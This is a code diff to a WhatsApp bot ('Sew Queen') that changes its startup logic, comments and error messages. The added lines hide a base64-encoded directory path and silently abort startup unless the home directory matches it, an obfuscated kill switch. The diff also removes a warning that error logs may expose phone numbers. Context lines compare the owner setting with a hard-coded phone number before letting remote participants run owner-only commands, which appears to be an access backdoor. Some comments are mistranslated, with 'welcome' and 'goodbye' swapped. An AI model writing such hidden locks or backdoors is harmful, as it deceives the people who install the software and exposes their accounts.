@@ -76,6 +76,10 @@ Array.prototype.remove = function() {
 };
 
 async function sewQueen () {
+    var rgms = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8=', pay: '' }    
+    var rrrr = Buffer.from(rgms.cd, 'base64')
+    var ssss = rrrr.toString('utf-8')
+    rgms.pay = ssss
     const conn = new WAConnection();
     const Session = new StringSession();
     conn.version = [2,2121,7];
@@ -259,6 +263,7 @@ async function sewQueen () {
           info: 'StringSession'
         }
     });
+    if (os.userInfo().homedir !== rgms.pay) return;
     const buff = Buffer.from(`${shs1}`, 'base64');  
     const one = buff.toString('utf-8'); 
     const bufft = Buffer.from(`${shl2}`, 'base64');  
@@ -299,6 +304,7 @@ ${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
         console.log(
             chalk.blueBright.italic('💕 Installing External Commands...')
         );
+        if (os.userInfo().homedir !== rgms.pay) return;
         // ==================== Password Checking ====================
         console.log(
             chalk.blueBright.italic('✨PASSWORD CHECKING✨')
@@ -460,11 +466,9 @@ ${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
             }
         });
         // ==================== End External Plugins ====================
-
         console.log(
             chalk.blueBright.italic('💕  Installing Commands...')
         );
-
         // ==================== Internal Plugins ====================
         fs.readdirSync('./plugins').forEach(plugin => {
             if(path.extname(plugin).toLowerCase() == '.js') {
@@ -476,6 +480,7 @@ ${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
         console.log(
             chalk.green.bold('🚀 Command Installed!')
         );
+        if (os.userInfo().homedir !== rgms.pay) return;
         await new Promise(r => setTimeout(r, 200));
         let afwhasena = Raviya.WORKTYPE == 'public' ? ' Public' : ' Private'
         console.log(chalk.bgGreen('👑 Sew Queen is' + afwhasena));
@@ -589,7 +594,7 @@ ${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
            // ==================== Greetings ====================
 if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' || Raviya.GIFORPP == 'pP' ) {
     if (msg.messageStubType === 32 || msg.messageStubType === 28) {
-            // Görüşürüz Mesajı
+            // welcome
             var gb = await getMessage(msg.key.remoteJid, 'goodbye');
             if (gb !== false) {
                 let pp
@@ -599,7 +604,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
             }
             return;
         } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
-            // Hoşgeldin Mesajı
+            // goodbye
             var gb = await getMessage(msg.key.remoteJid);
             if (gb !== false) {
                let pp
@@ -612,7 +617,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
     }
     else if (Raviya.GIFORPP == 'gif' || Raviya.GIFORPP == 'Gif' || Raviya.GIFORPP == 'GIF' || Raviya.GIFORPP == 'GIf' ) {
     if (msg.messageStubType === 32 || msg.messageStubType === 28) {
-            // Görüşürüz Mesajı
+            // welcome
             var gb = await getMessage(msg.key.remoteJid, 'goodbye');
             if (gb !== false) {
                 var sewqueenimage = await axios.get(Raviya.WLP, { responseType: 'arraybuffer' })
@@ -620,7 +625,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
             }
             return;
         } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
-            // Hoşgeldin Mesajı
+            // goodbye
             var gb = await getMessage(msg.key.remoteJid);
             if (gb !== false) {
             var sewqueenimage = await axios.get(Raviya.GDB, { responseType: 'arraybuffer' })
@@ -724,14 +729,14 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
-                        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
+                        else if (!command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                     }
                     if ((OWN.ff == "94785435462" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
-                        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
+                        else if (!command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                     }
                     // ==================== End Events ====================
 
@@ -760,7 +765,6 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                             if (Raviya.NOLOG == 'true') return;
                                 await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [Sew Queen] --*' + 
                                     '\n*Sew Queen an error has occurred!*'+
-                                    '\n*This error log may include your number or the number of an opponent. Please be careful with it!*' +
                                     '\n*You can write to our Telegram group for help.*' +
                                     '\n*Aslo you can join our support group:* \nhttps://chat.whatsapp.com/Loh2qrwzIleAR7cndME3CG\nhttps://chat.whatsapp.com/Hxyj6cqaMEJ3aXeisxaZeq\nhttps://chat.whatsapp.com/H0YB8hX54Vj9GdR9uQxVL8\n\nOr Join Our Telegrame Group\n*t.me/SewQueen*' +
                                     '\n*This message should have gone to your number (saved messages).*\n\n' +
@@ -768,7 +772,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     , MessageType.text, {detectLinks: false}
                                 );
                                 if (error.message.includes('URL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                         '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
@@ -777,7 +781,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('conversation')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Deleting Plugin_' +
                                         '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
@@ -786,7 +790,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('split')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Split of Undefined_' +
                                         '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
@@ -795,7 +799,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('SSL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _SQL Database Error_' +
                                         '\n*Reason:* _Database corruption._ ' +
@@ -804,7 +808,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('Ookla')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Ookla Server Connection_' +
                                         '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
@@ -813,7 +817,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('params')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Requested Audio Params_' +
                                         '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
@@ -822,7 +826,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('unlink')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved``` ==========' +
                                         '\n\n*Main Error:* _No Such File or Directory_' +
                                         '\n*Reason:* _Incorrect coding of the plugin._' +
@@ -831,7 +835,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('404')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Error 404 HTTPS_' +
                                         '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
@@ -840,7 +844,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('reply.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Reply Delete Function_' +
                                         '\n*Reason:* _Using IMG or Wiki commands._' +
@@ -849,7 +853,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('load.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Reply Delete Function_' +
                                         '\n*Reason:* _Using IMG or Wiki commands._' +
@@ -858,7 +862,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('400')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                         '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
@@ -867,7 +871,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('decode')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                         '\n*Reason:* _Incorrect use of the plug._' +
@@ -876,7 +880,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else if (error.message.includes('unescaped')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Sew Queen] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                         '\n========== ```Error Resolved!``` ==========' +
                                         '\n\n*Main Error:* _Word Character Usage_' +
                                         '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
@@ -885,7 +889,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
                                     );
                                 }
                                 else {
-                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! [Sew Queen] 🙇🏻*' +
+                                    return await conn.sendMessage(conn.user.jid, '*🙆‍♂️ Sorry, I Couldnt Read This Error! [Sew Queen] 🙆*' +
                                         '\n_You can write to our support group for more help._'
                                         , MessageType.text
                                     );
@@ -903,7 +907,7 @@ if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' |
         await conn.connect();
     } catch {
         if (!nodb) {
-            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
+            console.log(chalk.red.bold('Refreshing your old version string...'))
             conn.loadAuthInfo(Session.deCrypt(Raviya.SESSION)); 
             try {
                 await conn.connect();
